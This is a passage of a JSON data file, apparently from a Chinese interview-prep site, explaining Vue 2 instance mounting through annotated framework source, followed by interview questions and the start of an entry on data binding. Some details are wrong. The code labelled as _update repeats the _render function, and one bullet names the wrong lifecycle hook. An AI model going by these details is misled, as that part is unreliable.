vm.$mount(vm.$options.el)\n    }\n  }\n\n```\n\n仔细阅读上面的代码，我们得到以下结论：\n\n*   在调用`beforeCreate`之前，数据初始化并未完成，像`data`、`props`这些属性无法访问到\n*   到了`created`的时候，数据已经初始化完成，能够访问`data`、`props`这些属性，但这时候并未完成`dom`的挂载，因此无法访问到`dom`元素\n*   挂载方法是调用`vm.$mount`方法\n\n`initState`方法是完成`props/data/method/watch/methods`的初始化\n\n源码位置：src\\\\core\\\\instance\\\\state.js\n\n```javascript\nexport function initState (vm: Component) {\n  // 初始化组件的watcher列表\n  vm._watchers = []\n  const opts = vm.$options\n  // 初始化props\n  if (opts.props) initProps(vm, opts.props)\n  // 初始化methods方法\n  if (opts.methods) initMethods(vm, opts.methods)\n  if (opts.data) {\n    // 初始化data  \n    initData(vm)\n  } else {\n    observe(vm._data = {}, true /* asRootData */)\n  }\n  if (opts.computed) initComputed(vm, opts.computed)\n  if (opts.watch && opts.watch !== nativeWatch) {\n    initWatch(vm, opts.watch)\n  }\n}\n\n```\n\n我们和这里主要看初始化`data`的方法为`initData`，它与`initState`在同一文件上\n\n```javascript\nfunction initData (vm: Component) {\n  let data = vm.$options.data\n  // 获取到组件上的data\n  data = vm._data = typeof data === 'function'\n    ? getData(data, vm)\n    : data || {}\n  if (!isPlainObject(data)) {\n    data = {}\n    process.env.NODE_ENV !== 'production' && warn(\n      'data functions should return an object:\\n' +\n      'https://vuejs.org/v2/guide/components.html#data-Must-Be-a-Function',\n      vm\n    )\n  }\n  // proxy data on instance\n  const keys = Object.keys(data)\n  const props = vm.$options.props\n  const methods = vm.$options.methods\n  let i = keys.length\n  while (i--) {\n    const key = keys[i]\n    if (process.env.NODE_ENV !== 'production') {\n      // 属性名不能与方法名重复\n      if (methods && hasOwn(methods, key)) {\n        warn(\n          `Method \"${key}\" has already been defined as a data property.`,\n          vm\n        )\n      }\n    }\n    // 属性名不能与state名称重复\n    if (props && hasOwn(props, key)) {\n      process.env.NODE_ENV !== 'production' && warn(\n        `The data property \"${key}\" is already declared as a prop. ` +\n        `Use prop default value instead.`,\n        vm\n      )\n    } else if (!isReserved(key)) { // 验证key值的合法性\n      // 将_data中的数据挂载到组件vm上,这样就可以通过this.xxx访问到组件上的数据\n      proxy(vm, `_data`, key)\n    }\n  }\n  // observe data\n  // 响应式监听data是数据的变化\n  observe(data, true /* asRootData */)\n}\n\n```\n\n仔细阅读上面的代码，我们可以得到以下结论：\n\n*   初始化顺序：`props`、`methods`、`data`\n*   `data`定义的时候可选择函数形式或者对象形式（组件只能为函数形式）\n\n关于数据响应式在这就不展开详细说明\n\n上文提到挂载方法是调用`vm.$mount`方法\n\n源码位置：/src/platforms/web/entry-runtime-with-compiler.js#L18\n\n```javascript\nVue.prototype.$mount = function (\n  el?: string | Element,\n  hydrating?: boolean\n): Component {\n  // 获取或查询元素\n  el = el && query(el)\n\n  /* istanbul ignore if */\n  // vue 不允许直接挂载到body或页面文档上\n  if (el === document.body || el === document.documentElement) {\n    process.env.NODE_ENV !== 'production' && warn(\n      `Do not mount Vue to <html> or <body> - mount to normal elements instead.`\n    )\n    return this\n  }\n\n  const options = this.$options\n  // resolve template/el and convert to render function\n  if (!options.render) {\n    let template = options.template\n    // 存在template模板，解析vue模板文件\n    if (template) {\n      if (typeof template === 'string') {\n        if (template.charAt(0) === '#') {\n          template = idToTemplate(template)\n          /* istanbul ignore if */\n          if (process.env.NODE_ENV !== 'production' && !template) {\n            warn(\n              `Template element not found or is empty: ${options.template}`,\n              this\n            )\n          }\n        }\n      } else if (template.nodeType) {\n        template = template.innerHTML\n      } else {\n        if (process.env.NODE_ENV !== 'production') {\n          warn('invalid template option:' + template, this)\n        }\n        return this\n      }\n    } else if (el) {\n      // 通过选择器获取元素内容\n      template = getOuterHTML(el)\n    }\n    if (template) {\n      /* istanbul ignore if */\n      if (process.env.NODE_ENV !== 'production' && config.performance && mark) {\n        mark('compile')\n      }\n      /**\n       *  1.将temmplate解析ast tree\n       *  2.将ast tree转换成render语法字符串\n       *  3.生成render方法\n       */\n      const { render, staticRenderFns } = compileToFunctions(template, {\n        outputSourceRange: process.env.NODE_ENV !== 'production',\n        shouldDecodeNewlines,\n        shouldDecodeNewlinesForHref,\n        delimiters: options.delimiters,\n        comments: options.comments\n      }, this)\n      options.render = render\n      options.staticRenderFns = staticRenderFns\n\n      /* istanbul ignore if */\n      if (process.env.NODE_ENV !== 'production' && config.performance && mark) {\n        mark('compile end')\n        measure(`vue ${this._name} compile`, 'compile', 'compile end')\n      }\n    }\n  }\n  return mount.call(this, el, hydrating)\n}\n\n```\n\n阅读上面代码，我们能得到以下结论：\n\n*   不要将根元素放到`body`或者`html`上\n*   可以在对象中定义`template/render`或者直接使用`template`、`el`表示元素选择器\n*   最终都会解析成`render`函数，调用`compileToFunctions`，会将`template`解析成`render`函数\n\n对`template`的解析步骤大致分为以下几步：\n\n*   将`html`文档片段解析成`ast`描述符\n*   将`ast`描述符解析成字符串\n*   生成`render`函数\n\n生成`render`函数，挂载到`vm`上后，会再次调用`mount`方法\n\n源码位置：src\\\\platforms\\\\web\\\\runtime\\\\index.js\n\n```javascript\n// public mount method\nVue.prototype.$mount = function (\n  el?: string | Element,\n  hydrating?: boolean\n): Component {\n  el = el && inBrowser ? query(el) : undefined\n  // 渲染组件\n  return mountComponent(this, el, hydrating)\n}\n\n```\n\n调用`mountComponent`渲染组件\n\n```javascript\nexport function mountComponent (\n  vm: Component,\n  el: ?Element,\n  hydrating?: boolean\n): Component {\n  vm.$el = el\n  // 如果没有获取解析的render函数，则会抛出警告\n  // render是解析模板文件生成的\n  if (!vm.$options.render) {\n    vm.$options.render = createEmptyVNode\n    if (process.env.NODE_ENV !== 'production') {\n      /* istanbul ignore if */\n      if ((vm.$options.template && vm.$options.template.charAt(0) !== '#') ||\n        vm.$options.el || el) {\n        warn(\n          'You are using the runtime-only build of Vue where the template ' +\n          'compiler is not available. Either pre-compile the templates into ' +\n          'render functions, or use the compiler-included build.',\n          vm\n        )\n      } else {\n        // 没有获取到vue的模板文件\n        warn(\n          'Failed to mount component: template or render function not defined.',\n          vm\n        )\n      }\n    }\n  }\n  // 执行beforeMount钩子\n  callHook(vm, 'beforeMount')\n\n  let updateComponent\n  /* istanbul ignore if */\n  if (process.env.NODE_ENV !== 'production' && config.performance && mark) {\n    updateComponent = () => {\n      const name = vm._name\n      const id = vm._uid\n      const startTag = `vue-perf-start:${id}`\n      const endTag = `vue-perf-end:${id}`\n\n      mark(startTag)\n      const vnode = vm._render()\n      mark(endTag)\n      measure(`vue ${name} render`, startTag, endTag)\n\n      mark(startTag)\n      vm._update(vnode, hydrating)\n      mark(endTag)\n      measure(`vue ${name} patch`, startTag, endTag)\n    }\n  } else {\n    // 定义更新函数\n    updateComponent = () => {\n      // 实际调⽤是在lifeCycleMixin中定义的_update和renderMixin中定义的_render\n      vm._update(vm._render(), hydrating)\n    }\n  }\n  // we set this to vm._watcher inside the watcher's constructor\n  // since the watcher's initial patch may call $forceUpdate (e.g. inside child\n  // component's mounted hook), which relies on vm._watcher being already defined\n  // 监听当前组件状态，当有数据变化时，更新组件\n  new Watcher(vm, updateComponent, noop, {\n    before () {\n      if (vm._isMounted && !vm._isDestroyed) {\n        // 数据更新引发的组件更新\n        callHook(vm, 'beforeUpdate')\n      }\n    }\n  }, true /* isRenderWatcher */)\n  hydrating = false\n\n  // manually mounted instance, call mounted on self\n  // mounted is called for render-created child components in its inserted hook\n  if (vm.$vnode == null) {\n    vm._isMounted = true\n    callHook(vm, 'mounted')\n  }\n  return vm\n}\n\n```\n\n阅读上面代码，我们得到以下结论：\n\n*   会触发`boforeCreate`钩子\n*   定义`updateComponent`渲染页面视图的方法\n*   监听组件数据，一旦发生变化，触发`beforeUpdate`生命钩子\n\n`updateComponent`方法主要执行在`vue`初始化时声明的`render`，`update`方法\n\n`render`的作用主要是生成`vnode`\n\n源码位置：src\\\\core\\\\instance\\\\render.js\n\n```javascript\n// 定义vue 原型上的render方法\nVue.prototype._render = function (): VNode {\n    const vm: Component = this\n    // render函数来自于组件的option\n    const { render, _parentVnode } = vm.$options\n\n    if (_parentVnode) {\n        vm.$scopedSlots = normalizeScopedSlots(\n            _parentVnode.data.scopedSlots,\n            vm.$slots,\n            vm.$scopedSlots\n        )\n    }\n\n    // set parent vnode. this allows render functions to have access\n    // to the data on the placeholder node.\n    vm.$vnode = _parentVnode\n    // render self\n    let vnode\n    try {\n        // There's no need to maintain a stack because all render fns are called\n        // separately from one another. Nested component's render fns are called\n        // when parent component is patched.\n        currentRenderingInstance = vm\n        // 调用render方法，自己的独特的render方法， 传入createElement参数，生成vNode\n        vnode = render.call(vm._renderProxy, vm.$createElement)\n    } catch (e) {\n        handleError(e, vm, `render`)\n        // return error render result,\n        // or previous vnode to prevent render error causing blank component\n        /* istanbul ignore else */\n        if (process.env.NODE_ENV !== 'production' && vm.$options.renderError) {\n            try {\n                vnode = vm.$options.renderError.call(vm._renderProxy, vm.$createElement, e)\n            } catch (e) {\n                handleError(e, vm, `renderError`)\n                vnode = vm._vnode\n            }\n        } else {\n            vnode = vm._vnode\n        }\n    } finally {\n        currentRenderingInstance = null\n    }\n    // if the returned array contains only a single node, allow it\n    if (Array.isArray(vnode) && vnode.length === 1) {\n        vnode = vnode[0]\n    }\n    // return empty vnode in case the render function errored out\n    if (!(vnode instanceof VNode)) {\n        if (process.env.NODE_ENV !== 'production' && Array.isArray(vnode)) {\n            warn(\n                'Multiple root nodes returned from render function. Render function ' +\n                'should return a single root node.',\n                vm\n            )\n        }\n        vnode = createEmptyVNode()\n    }\n    // set parent\n    vnode.parent = _parentVnode\n    return vnode\n}\n\n```\n\n`_update`主要功能是调用`patch`，将`vnode`转换为真实`DOM`，并且更新到页面中\n\n源码位置：src\\\\core\\\\instance\\\\lifecycle.js\n\n```javascript\n// 定义vue 原型上的render方法\nVue.prototype._render = function (): VNode {\n    const vm: Component = this\n    // render函数来自于组件的option\n    const { render, _parentVnode } = vm.$options\n\n    if (_parentVnode) {\n        vm.$scopedSlots = normalizeScopedSlots(\n            _parentVnode.data.scopedSlots,\n            vm.$slots,\n            vm.$scopedSlots\n        )\n    }\n\n    // set parent vnode. this allows render functions to have access\n    // to the data on the placeholder node.\n    vm.$vnode = _parentVnode\n    // render self\n    let vnode\n    try {\n        // There's no need to maintain a stack because all render fns are called\n        // separately from one another. Nested component's render fns are called\n        // when parent component is patched.\n        currentRenderingInstance = vm\n        // 调用render方法，自己的独特的render方法， 传入createElement参数，生成vNode\n        vnode = render.call(vm._renderProxy, vm.$createElement)\n    } catch (e) {\n        handleError(e, vm, `render`)\n        // return error render result,\n        // or previous vnode to prevent render error causing blank component\n        /* istanbul ignore else */\n        if (process.env.NODE_ENV !== 'production' && vm.$options.renderError) {\n            try {\n                vnode = vm.$options.renderError.call(vm._renderProxy, vm.$createElement, e)\n            } catch (e) {\n                handleError(e, vm, `renderError`)\n                vnode = vm._vnode\n            }\n        } else {\n            vnode = vm._vnode\n        }\n    } finally {\n        currentRenderingInstance = null\n    }\n    // if the returned array contains only a single node, allow it\n    if (Array.isArray(vnode) && vnode.length === 1) {\n        vnode = vnode[0]\n    }\n    // return empty vnode in case the render function errored out\n    if (!(vnode instanceof VNode)) {\n        if (process.env.NODE_ENV !== 'production' && Array.isArray(vnode)) {\n            warn(\n                'Multiple root nodes returned from render function. Render function ' +\n                'should return a single root node.',\n                vm\n            )\n        }\n        vnode = createEmptyVNode()\n    }\n    // set parent\n    vnode.parent = _parentVnode\n    return vnode\n}\n\n```\n\n### **三、结论**\n\n*   `new Vue`的时候调用会调用`_init`方法\n    *   定义 set、get 、delete、watch 等方法\n    *   定义 on、off、emit、off等事件\n    *   定义 \\_update、forceUpdate、destroy生命周期\n*   调用`$mount`进行页面的挂载\n*   挂载的时候主要是通过`mountComponent`方法\n*   定义`updateComponent`更新函数\n*   执行`render`生成虚拟`DOM`\n*   `_update`将虚拟`DOM`生成真实`DOM`结构，并且渲染到页面中\n",
    "testPoint": "### **1. 生命周期钩子**\n#### **问题**：\n- Vue 的挂载过程中涉及哪些生命周期钩子？它们的执行顺序是怎样的？\n- `beforeCreate` 和 `created` 钩子之间有什么区别？\n- `mounted` 钩子中的常见应用场景是什么？\n\n#### **关键点**：\n- 知道生命周期的顺序和作用。\n- **`beforeCreate`**: 数据未初始化，无法访问 `data` 和 `methods`。\n- **`created`**: 响应式数据已可用，但未挂载 DOM。\n- **`beforeMount`** 和 **`mounted`**: 掌握挂载前后 DOM 的状态。\n\n---\n\n### **2. 挂载目标**\n#### **问题**：\n- Vue 实例挂载的目标（`el`）必须满足哪些条件？\n- 如果指定的 `el` 元素不存在，会发生什么？\n- 如何动态挂载 Vue 实例？\n\n#### **关键点**：\n- `el` 必须是一个已存在的 DOM 元素或 CSS 选择器。\n- 如果 `el` 不存在，Vue 会创建一个空的 DOM 元素作为挂载点。\n- 动态挂载示例：\n  ```javascript\n  const app = new Vue({\n    render: h => h(App)\n  });\n  app.$mount('#app');\n  ```\n\n---\n\n### **3. 模板编译**\n#### **问题**：\n- Vue 挂载时，`template`、`render` 和 `el` 的关系是什么？\n- 如果同时提供了 `template` 和 `render`，优先级如何？\n- Vue 的模板编译过程是什么样的？\n\n#### **关键点**：\n- 优先级：`render` > `template` > `el` 内部的 HTML。\n- 运行时版（`vue.runtime.js`）无法直接编译模板，需使用预编译后的 `render` 函数。\n\n---\n\n### **4. 响应式系统初始化**\n#### **问题**：\n- 挂载过程中，响应式系统在什么时候被初始化？\n- `data` 对象在挂载前后有什么变化？\n- Vue 是如何保证数据与视图之间的绑定的？\n\n#### **关键点**：\n- 数据响应式是在 `beforeCreate` 和 `created` 阶段完成的。\n- Vue 使用 `Object.defineProperty` 或 `Proxy`（Vue 3）实现响应式数据绑定。\n\n---\n\n### **5. 挂载前后的 DOM 操作**\n#### **问题**：\n- 在 `beforeMount` 和 `mounted` 钩子中，DOM 的状态有何不同？\n- 为什么不建议在 `created` 钩子中直接操作 DOM？\n- Vue 挂载后，如何动态更新 DOM？\n\n#### **关键点**：\n- 在 `beforeMount` 阶段，Vue 虚拟 DOM 已生成，但未映射到真实 DOM。\n- 在 `mounted` 阶段，真实 DOM 可用，适合进行第三方库的 DOM 操作。\n\n---\n\n### **6. 挂载优化**\n#### **问题**：\n- Vue 的挂载过程如何影响性能？\n- 有哪些优化挂载过程的方法？\n- 如何避免挂载过程中出现白屏问题？\n\n#### **关键点**：\n- 使用 `v-cloak` 避免模板渲染前的白屏：\n  ```css\n  [v-cloak] {\n    display: none;\n  }\n  ```\n- 优化挂载性能：\n  - 减少初始数据体积。\n  - 延迟挂载不必要的组件（按需加载）。\n  - 使用预渲染或服务端渲染（SSR）。\n\n---\n\n### **7. 实践与问题排查**\n#### **问题**：\n- 如果挂载后视图未正常渲染，你会如何排查问题？\n- 在项目中是否遇到过挂载相关的问题？如何解决？\n- 如何挂载多个 Vue 实例到不同的 DOM 节点？\n\n#### **关键点**：\n- 排查挂载问题：\n  - 检查 `el` 是否存在。\n  - 确认 `data` 或模板中是否有语法错误。\n- 多实例挂载：\n  ```javascript\n  new Vue({ el: '#app1' });\n  new Vue({ el: '#app2' });\n  ```\n\n---\n\n### **8. Vue 3 的挂载变化**\n#### **问题**：\n- Vue 3 的挂载过程与 Vue 2 有何不同？\n- Vue 3 的 `createApp` 方法如何取代 Vue 2 的 `new Vue`？\n- Vue 3 是否支持多个应用实例共存？\n\n#### **关键点**：\n- Vue 3 使用 `createApp` 创建实例：\n  ```javascript\n  import { createApp } from 'vue';\n  const app = createApp(App);\n  app.mount('#app');\n  ```\n- 支持多个应用实例共存，实例之间彼此独立。\n\n---\n\n### **9. 自定义指令与挂载的关系**\n#### **问题**：\n- 自定义指令（如 `v-focus`）如何与 Vue 挂载过程关联？\n- 在自定义指令中，哪个生命周期适合操作 DOM？\n\n#### **关键点**：\n- 自定义指令的生命周期（Vue 2 和 3）：\n  - `bind`/`beforeMount`：绑定时触发。\n  - `inserted`/`mounted`：元素插入 DOM 后触发，适合操作 DOM。\n\n---\n\n### **10. 开放性问题**\n#### **问题**：\n- Vue 的挂载过程与 React 有何异同？\n- 如何在挂载过程中注入异步数据？\n- Vue 的挂载机制是否有改进空间？你会如何设计？\n\n#### **关键点**：\n- 展现候选人对 Vue 框架的深度理解，以及解决问题的能力。\n\n---\n\n### 面试总结\n通过考察 **Vue实例挂载**，可以了解候选人对 Vue 生命周期、响应式系统、模板编译、性能优化等核心机制的掌握情况，特别是在实际项目中如何应用这些知识以解决问题。优秀的候选人应具备扎实的理论基础，并能结合实际经验深入阐述。",
    "exerciseKeyList": "[\"41132096-4901-45d1-a453-6119931a083e\"]",
    "vipLimit": 1,
    "level": 3.5,
    "pointOrder": 1,
    "createAt": "2024-10-04T12:20:39.000Z",
    "updateAt": "2024-12-15T11:14:24.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "41132096-4901-45d1-a453-6119931a083e",
        "title": "Vue实例挂载的过程中发生了什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T03:31:18.000Z",
        "updateAt": "2024-08-10T17:04:38.000Z"
      }
    ]
  },
  "65": {
    "id": 65,
    "tagId": 14,
    "title": "数据绑定",
    "explanation": "### 1\\. 定义\n\n#### **1.1 双向绑定 & 单向绑定**\n\nvue的双向绑定，即数据与视图的`响应式`设计。具体表现为：`View`的改变能实时让`Model`发生变化，而`Model`的变化也能实时更新`View`。\n\n什么情况下用户可以更新View呢？如：`填写表单`。当用户填写表单时，View的状态就被更新了，如果此时MVVM框架可以自动更新Model的状态，那就相当于把Model和View做了双向绑定。\n\n注意区别：`单向数据绑定`，所有数据只有一份，一旦数据变化，就去更新页面(只有data-->DOM，没有DOM-->data)。\n\n*   用户在页面作出更新，需要用户手动收集(双向绑定是自动收集)，在合并到原有的数据中。\n\nVue.js中的v-model主要用在表单的input输入框，完成视图和数据的双向绑定：\n\n```html\n<!DOCTYPE html>\n<html>\n<head></head>\n<body>\n    <div id=\"app\">\n        <input type=\"text\" v-model=\"message\">\n        <p>{{message}}</p>\n    </div>\n    <script>\n        var app = new Vue({\n            el: '#app',\n            data: {\n                message: ''\n            }\n        });\n    </script>\n</body>\n</html>\n\n```\n\n#### **1.2 v-model来添加双向绑定**\n\n```html\n<input v-model=\"xxx\">\n\n<!-- 上面的代码等价于 -->\n<input :value=\"xxx\" @input=\"xxx = $event.target.value\">\n<!-- 双向绑定 = 单向绑定 + UI事件监听 -->\n\n```\n\n#### **1.3 双向绑定、单向绑定的优缺点**\n\n*   **单向绑定**：数据流也是单向的，对于复杂应用来说是实施统一状态管理（如redux）的前提。\n*   **双向绑定**：在一些需要`实时`反应用户输入的场合会非常方便（如多级联动菜单）。但常认为复杂应用中这种便利比不上引入状态管理带来的优势。因为不知道状态什么时候发生改变，是谁造成的改变，数据变更也不会通知。\n\n响应式的思路：`mvvm` **Model，View，View-Model**\n\n* * *\n\n### 2\\. 原理概述\n\nVue 数据双向绑定原理是通过 `数据劫持` + `发布者-订阅者模式` 的方式来实现的，首先是通过 `ES5` 提供的 `Object.defineProperty()` 方法来劫持（监听）各属性的 **getter、setter**，并在当监听的属性发生变动时通知订阅者，是否需要更新，若更新就会执行对应的更新函数。详见 [vue源码](https://github.com/vuejs/vue)。\n\n*   常见的`基于数据劫持`的**双向绑定**有两种实现\n    *   一个是目前Vue在用的 `Object.defineProperty`\n    *   一个是ES2015中新增的 `Proxy`，而在Vue3.0版本后加入Proxy从而代替Object.defineProperty\n\n* * *\n\n### 3\\. 基于数据劫持实现的双向绑定\n\n#### 3.1 几种实现双向绑定的做法\n\n目前几种主流的`mvc(vm)框架`都实现了**单向数据绑定**，而**双向数据绑定**可以理解为是在单向绑定的基础上给可输入元素（input、textarea等）添加了change(input)事件，来动态修改model和 view。\n\n实现`数据绑定`的做法有大致如下几种：\n\n> 发布者-订阅者模式（backbone.js）\n\n> 脏值检查（angular.js）\n\n> 数据劫持（vue.js）\n\n`发布者-订阅者模式:` 一般通过**sub**，**pub**的方式实现数据和视图的绑定监听，更新数据方式通常做法是 **vm.set('property', value)**。而我们更希望通过 **vm.property = value** 这种方式更新数据，同时自动更新视图，于是有了下面两种方式。\n\n`脏值检查:` angular.js 是通过**脏值检测的方式**比对数据是否有变更，来决定是否更新视图，最简单的方式就是通过 **setInterval()** 定时轮询检测数据变动，当然Google 限制 angular只有在指定的事件触发时进入脏值检测，大致如下：\n\n*   DOM事件，如用户输入文本，点击按钮等。( ng-click )\n*   XHR响应事件 ( `$http` )\n*   浏览器Location变更事件 ( `$location` )\n*   Timer事件( `$timeout` , `$interval` )\n*   执行 `$digest()` 或 `$apply()`\n\n`数据劫持:` vue.js 则是采用**数据劫持**结合**发布者-订阅者模式**的方式，通过**Object.defineProperty()** 来劫持各个属性的 **setter**，**getter**，在数据变动时发布消息给订阅者，触发相应的 **监听回调**。\n\n#### 3.2 数据劫持\n\n##### 3.2.1 什么是数据劫持\n\n数据劫持比较好理解，通常我们利用`Object.defineProperty`劫持对象的访问器，在属性值发生变化时我们可以获取变化，从而进行进一步操作。\n\n##### 3.2.2 数据劫持的优势\n\n目前业界分为两个大的流派，一个是以React为首的单向数据绑定，另一个是以Angular、Vue为主的双向数据绑定。\n\n> 三大框架都是既可以双向绑定 也可以单向绑定，如React可以手动绑定onChange和value实现双向绑定，也可以调用一些双向绑定库；Vue也加入了props这种单向流的api。\n\n对比其他双向绑定的实现方法，**数据劫持**的优势所在：\n\n1.  **无需显示调用**: 例如Vue运用数据劫持+发布订阅，直接可以通知变化并驱动视图，而如Angular的脏检测则需要显示调用markForCheck(可以用zone.js避免显示调用,不展开)，react需要显示调用setState。\n2.  **可精确得知变化数据**：劫持了属性的setter,当属性值改变,可以精确获知变化的内容`newVal`，因此在这部分不需要额外的diff操作，否则只知道数据发生了变化而不知道具体哪些数据变化了，这个时候需要大量diff来找出变化值是额外性能损耗。\n\n#### 3.3 实现思路\n\n基于数据劫持双向绑定的实现思路：**数据劫持**是双向绑定各种方案中比较流行的一种，最著名的实现是Vue。\n\n要实现一个完整的双向绑定需要以下几个要点：\n\n1.  利用`Proxy`或`Object.defineProperty`生成的`Observer`针对对象/对象的属性进行\"劫持\",在属性发生变化后通知订阅者\n2.  解析器`Compile`解析模板中的`Directive`(指令)，收集指令所依赖的方法和数据,等待数据变化然后进行渲染\n3.  `Watcher`属于`Observer`和`Compile`桥梁,它将接收到的`Observer`产生的数据变化,并根据`Compile`提供的指令进行视图渲染,使得数据变化促使视图变化\n\n#### 3.4 特点\n\n基于Object.defineProperty双向绑定的特点：\n\n> 对Object.defineProperty还不了解的请阅读[文档](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty)\n\n```javascript\nconst object1 = {};\n Object.defineProperty(object1, 'property1', {\n  value: 11,\n  writable: false\n });\n object1.property1 = 2;\n *// throws an error in strict mode*\n console.log(object1.property1);\n *// expected output: 11*\n\n```\n\n**Object.defineProperty()** 方法会直接在一个对象上定义一个新属性，或者修改一个对象的现有属性，并返回此对象。\n\n* * *\n\n### 4\\. 深入vue的双向数据绑定原理以及核心代码模块\n\n#### 4.1 准备知识\n\n**1 \\[ \\].slice.call(lis): 将伪数组转换为真数组**\n\n```html\n<body>\n  <ul>\n    <li>111</li>\n    <li>222</li>\n    <li>333</li>\n  </ul>\n</body>\n\n```\n```javascript\n//1.  [].slice.call(lis):通过实例调用方法，将伪数组转换为真数组   \n//.call()让一个函数在指定对象上调用\n  const lis = document.getElementsByTagName('li')     //lis是伪数组\n  console.log(lis instanceof Array, lis[1].innerHTML, lis.forEach)\n  //false    \"222\"    undefined             \n  //对象属性（lis.forEach）查找的是原型链，找不到就是undefined (因为是伪数组，不具备数组的方法)\n  \n  //ES6中将伪数组转换为真数组：Array.from(lis)\n  //ES5中Array.prototype.slice(begin,end)相当于（ 浅拷贝,但是原数组不变这点类似深拷贝），若是不指定begin,end，就是全部\n  //slice在数组原型上，call()让一个函数在指定对象上面调用\n  const lis2 = Array.prototype.slice.call(lis)  //推荐  \n  //.call(lis) 让一个函数成为指定对象的方法进行调用\n  console.log(lis2 instanceof Array,lis2[1].innerHTML,lis2.forEach)\n  //true    \"222\"     ƒ forEach() { [native code] }          \n  //这样就可以通过.forEach来遍历数组了\n\n```\n\n**2 node.nodeType: 得到节点类型**\n\n```\n *//2. node.nodeType:得到节点类型，最大的节点document    //document,element,attr,text*\n const elementNode = document.getElementById('test')    *//元素节点*\n const attrNode = elementNode.getAttributeNode('id')    *//属性节点*\n const textNode = elementNode.firstChild          *//文本节点*\n *//不同节点的nodeType是不同的，是他们的标识。当要调用getAttr()(只有元素节点才有)时就需要知道nodeType了,nodeType=1*\n\n console.log(elementNode.nodeType, attrNode.nodeType, textNode.nodeType) *//1 2 3*\n\n```\n\n**3 属性描述符分为：**数据描述符**(其他都是)，**访问描述符**（get,set）**\n\nObject.defineProperty(obj,propName,{}): 给对象添加/修改属性(指定描述符)\n\n```javascript\n//3.Object.defineProperty(obj,propertyName,{}):给对象添加属性（指定描述符）\n  const obj={\n    firstName:'A',\n    lastName:'B'\n  }\n  //给obj添加fullName属性，且能自动同步\n  /*\n  属性描述符：\n    2.访问描述符\n      get：回调函数，根据其他相关的属性，动态计算得到当前属性值\n      set：回调函数，监视当前属性值的变化，更新其他相关属性\n  */\n  Object.defineProperty(obj,'fullName',{\n    get(){\n      return this.firstName + '-' + this.lastName\n    },\n    set(value){\n      //更新firstName,lastName\n      const names =value.split('-')\n      this.firstName = names[0],\n      this.lastName = names[1]\n    }\n  })\n  console.log(obj.fullName)     //A-B\n  //修改属性\n  obj.firstName = 'C'\n  obj.lastName = 'D'\n  console.log(obj.fullName)     //C-D\n  obj.fullName = 'E-F'\n  console.log(obj.firstName, obj.lastName)    //E  F\n   /*\n  属性描述符：\n  1.数据描述符\n      configurable:是否可以重新定义\n      enumerable:是否可以枚举\n      value：初始值\n      writable：是否可以修改属性值,默认为 false。*/\n  Object.defineProperty(obj,'fullName2',{\n    configurable:false,\n    enumerable:true,\n    value:'G-H',\n    writable:false\n  })\n  console.log(obj.fullName2)      //G-H\n  obj.fullName2 = 'J-K'\n  console.log(obj.fullName2)      //G-H  不能修改\n\n```\n\n**4 Object.keys(obj): 得到对象自身**可枚举**的属性名的数组**\n\n```javascript\n  //4.Object.keys(obj):得到对象自身可枚举属性组成的数组\n    //枚举 for in\n  const names = Object.keys(obj)//返回所有对象组成的数组\n  console.log(names)//  [\"firstName\",\"lastName\",\"fullName2\"]\n\n```\n\n**5 obj.hasOwnProperty(prop): 判断 prop 是否是 obj 自身的属性**\n\n```javascript\n//5.obj.hasOwnProperty(prop):判断prop是否是obj自身的属性\n  console.log(obj.hasOwnProperty('fullName'), obj.hasOwnProperty('toString'))\n  //true false      \n  //toString也可能是原型链上的\n\n```\n\n**6 DocumentFragment: 文档碎片(高效**批量更新**多个节点)**\n\n```html\n<body>\n  <ul>\n    <li>111</li>\n    <li>222</li>\n    <li>333</li>\n  </ul>\n</body>\n\n```\n```javascript\n//6.DocumentFragment:文档碎片（高效批量更新多个节点）\n    //Document对应显示的页面，包含 n个element,一旦更新 Document内部的某个元素界面更新\n    //DocumentFragment：内存中保存 n个element的容器对象（不与界面关联），如果更新Fragment中的某个element，界面不变\n    //将多次更新变成了一次批量更新，减少更新的次数\n    /*\n     <ul id=\"fragment_test\">\n    <li>111</li>\n    <li>222</li>\n    <li>333</li>\n  </ul>\n    */\n  const ul = document.getElementById('fragment_test')\n  //1)创建fragment\n  const fragment = document.createDocumentFragment()\n  //2)取出ul中所有子节点，取出保存到fragment----转移\n  let child\n  while (child = ul.firstChild) {     //一个节点只能有一个父亲\n    fragment.appendChild(child)       //先将child从ul中移出，添加为fragment的子节点\n  }\n  //3)更新fragment中所有li的文本      //childNode得到所有子节点   //children得到所有子标签  //fragment.childNodes通过dom方式得到的都是伪数组\n      //fragment.childNodes\n  //Array.prototype.slice.call(fragment.childNodes) 真数组  拿到的节点有两种可能性（1.换行的文本2.标签<li>）\n  Array.prototype.slice.call(fragment.childNodes).forEach(node =>{\n    if(node.nodeType===1){        //元素节点----<li>  即判断是不是标签节点\n      node.textContent = 'dddddd' //此时页面不显示。不更新---与页面不相关，仅仅是内存独立的东西\n    }\n  })\n  //4)将fragment插入到ul\n  ul.appendChild(fragment)  //.appendChild() 接收node类型\n\n```\n\n#### 4.2 数据代理\n\n*   `数据代理:` 通过**一个对象代理** 对 **另一个对象(在前一个对象内部)中属性的操作(读/写)**\n*   vue 数据代理: 通过 **vm 对象**来代理 data 对象中所有属性的操作\n*   好处: 更方便的操作 data 中的数据\n*   基本实现流程\n    *   通过 **Object.defineProperty(vm, key, { })** 给vm添加与data对象的属性对应的属性\n    *   所有 **添加的属性都包含get/set方法**\n    *   在get/set方法中去操作data中对应的属性\n\n```html\n<body>\n  <div id=\"test\"></div>\n</body>\n<script type=\"text/javascript\" src=\"js/vue.js\"></script>\n<script type=\"text/javascript\">\nconst vm = new Vue({\n  el:'#test',\n  data:{\n    name:'feifei'\n  }\n})\nconsole.log(vm.name)//feifei\nconsole.log(vm)       //vm代理对data数据的“读”操作\nvm.name = 'xiaoxiao'  //vm代理对data数据的“写”操作\nconsole.log(vm._data.name)//xiaoxiao    注意这里是vm._data.name\nconsole.log(vm.name)//xiaoxiao\n</script>\n\n```\n\n**案例**\n\n```html\n<body>\n<div id=\"test\"></div>\n<!--实现 数据代理-->\n<script type=\"text/javascript\" src=\"js/mvvm/compile.js\"></script> <!--编译解析模板-->\n<script type=\"text/javascript\" src=\"js/mvvm/mvvm.js\"></script>\n<script type=\"text/javascript\" 